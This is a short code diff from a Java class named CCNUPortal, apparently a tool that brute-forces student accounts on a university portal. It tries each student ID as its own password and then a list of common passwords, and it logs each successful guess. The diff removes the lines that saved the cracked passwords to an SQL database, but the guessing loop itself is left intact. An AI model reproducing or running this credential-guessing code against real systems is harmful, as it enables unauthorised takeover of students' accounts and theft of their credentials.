@@ -75,13 +75,11 @@ public class CCNUPortal {
 			if (CCNUPortal.XHMMisTrue(xh, xh)) {
 				log.info("成功猜对账号{}密码{}", xh, xh);
 				re++;
-				ManageStudents.update_PasswordToSQL(xh, xh);
 			} else {
 				for (String one : pass) {
 					if (CCNUPortal.XHMMisTrue(xh, one)) {
 						log.info("成功猜对账号{}密码{}", xh, one);
 						re++;
-						ManageStudents.update_PasswordToSQL(xh, one);
 					}
 				}
 			}
